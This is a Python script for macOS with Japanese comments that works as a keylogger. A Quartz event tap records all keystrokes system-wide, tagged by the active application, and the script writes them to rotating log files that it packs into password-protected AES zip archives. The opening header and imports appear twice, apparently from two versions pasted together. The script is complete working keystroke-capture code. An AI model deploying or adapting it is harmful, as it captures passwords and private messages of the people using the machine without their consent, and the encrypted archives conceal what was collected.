#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from __future__ import annotations
import ctypes
import datetime as _dt
import signal
import sys
from typing import List

import objc
from Cocoa import (
    NSObject,
    NSWorkspace,
    NSWorkspaceDidActivateApplicationNotification,
)
from Quartz import (
    CGEventTapCreate,
    CGEventTapEnable,
    CGEventKeyboardGetUnicodeString,
    CGEventGetIntegerValueField,
    CFMachPortCreateRunLoopSource,
    CFRunLoopAddSource,
    CFRunLoopGetCurrent,
    CFRunLoopRun,
    CFRunLoopStop,
    kCFRunLoopCommonModes,
    kCGSessionEventTap,
    kCGHeadInsertEventTap,
    kCGEventTapOptionDefault,
    kCGEventKeyDown,
    kCGEventFlagsChanged,
    kCGKeyboardEventKeycode,
)

# --- Application‑switch observer ------------------------------------------------

#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import ctypes as _ctypes            # Quartz の前に import 必須
import datetime as dt
import os
import signal
import sys
import time
from pathlib import Path
from typing import IO, List, Optional

import objc
import pyminizip                    # AES-256 encrypted zip
from Cocoa import (
    NSObject,
    NSWorkspace,
    NSWorkspaceDidActivateApplicationNotification,
)
from Quartz import *                # noqa: F403 – PyObjC の惯例

# ─────────────────────────  ローテーション設定  ───────────────────────── #

HOME          = Path.home()
LOG_DIR       = HOME / "activity_logs"
LOG_DIR.mkdir(exist_ok=True)

MAX_SIZE      = 1 * 1024 * 1024     # 1 MB
ROTATE_SPAN   = 24 * 60 * 60        # 1 日（秒）
ZIP_PASSWORD  = os.getenv("ZIP_PASSWORD")

class RotatingWriter:
    """サイズ / 経過時間でローテーションし、旧ログを暗号 ZIP 化"""

    def __init__(self, directory: Path):
        self.dir: Path = directory
        self.fp: Optional[IO[str]] = None
        self.created_at: float = 0.0
        self._open_new()

    # ────────────────────────────────────────────── #
    def _open_new(self) -> None:
        ts = dt.datetime.now().strftime("%Y%m%d_%H%M%S")
        self.curfile: Path = self.dir / f"log_{ts}.txt"
        self.fp = self.curfile.open("a", encoding="utf-8")
        self.created_at = time.time()

    def _zip_encrypt(self, file_: Path) -> None:
        zip_path = str(file_.with_suffix(".zip"))
        pyminizip.compress(
            str(file_),
            None,
            zip_path,
            ZIP_PASSWORD,
            5,          # 圧縮レベル 1–9
        )
        file_.unlink(missing_ok=True)

    def _rotate_if_needed(self) -> None:
        assert self.fp
        if (self.fp.tell() >= MAX_SIZE) or (time.time() - self.created_at >= ROTATE_SPAN):
            self.fp.close()
            self._zip_encrypt(self.curfile)
            self._open_new()

    # ────────────────────────────────────────────── #
    def write(self, line: str, also_print: bool = True) -> None:
        if also_print:
            print(line)
        assert self.fp
        self.fp.write(line + "\n")
        self.fp.flush()
        self._rotate_if_needed()

    def close(self) -> None:
        if self.fp:
            self.fp.close()
            self._zip_encrypt(self.curfile)

writer = RotatingWriter(LOG_DIR)

# ──────────────────────  アプリ切り替えオブザーバ  ────────────────────── #

class AppObserver(NSObject):
    _current = None  # type: str | None

    def didActivateApp_(self, notification):  # noqa: N802
        app = notification.userInfo()["NSWorkspaceApplicationKey"].localizedName()
        if app != self._current:
            self._current = app
            stamp = dt.datetime.now().strftime("%H:%M:%S")
            flush_buffer()
            writer.write(f"\n🗂️  APP  {app}  ({stamp})")

    def start(self):
        nc = NSWorkspace.sharedWorkspace().notificationCenter()
        nc.addObserver_selector_name_object_(
            self,
            objc.selector(self.didActivateApp_, signature=b"v@:@"),
            NSWorkspaceDidActivateApplicationNotification,
            None,
        )

# ────────────────────────  キー入力イベントタップ  ─────────────────────── #

MASK = (1 << kCGEventKeyDown) | (1 << kCGEventFlagsChanged)
_buffer: List[str] = []

def flush_buffer() -> None:
    if _buffer:
        writer.write(f"TXT  {''.join(_buffer)}")
        _buffer.clear()

def keyboard_cb(proxy, etype, event, refcon):  # noqa: ANN001
    if etype != kCGEventKeyDown:
        return event

    _, text = CGEventKeyboardGetUnicodeString(event, 255, None, None)
    keycode = CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode)

    if keycode in (36, 76):               # Return / Enter
        flush_buffer()
    elif keycode == 51:                   # Delete / Backspace
        if _buffer:
            _buffer.pop()
    else:
        if text:
            _buffer.append(text)
    return event

# ───────────────────────────────  メイン  ─────────────────────────────── #

def main() -> None:
    tap = CGEventTapCreate(
        kCGSessionEventTap,
        kCGHeadInsertEventTap,
        kCGEventTapOptionDefault,
        MASK,
        keyboard_cb,
        None,
    )
    if tap is None:
        sys.exit("❌  CGEventTapCreate failed – check permissions.")

    src = CFMachPortCreateRunLoopSource(None, tap, 0)
    CFRunLoopAddSource(CFRunLoopGetCurrent(), src, kCFRunLoopCommonModes)
    CGEventTapEnable(tap, True)

    observer = AppObserver.alloc().init()
    observer.start()

    def _stop(sig, frame):  # noqa: ANN001
        writer.write("\n⏹  Stopping …", also_print=True)
        flush_buffer()
        writer.close()
        CGEventTapEnable(tap, False)
        CFRunLoopStop(CFRunLoopGetCurrent())

    signal.signal(signal.SIGINT, _stop)

    writer.write("🟢  Start logging …  (Ctrl-C to quit)")
    CFRunLoopRun()

if __name__ == "__main__":
    main()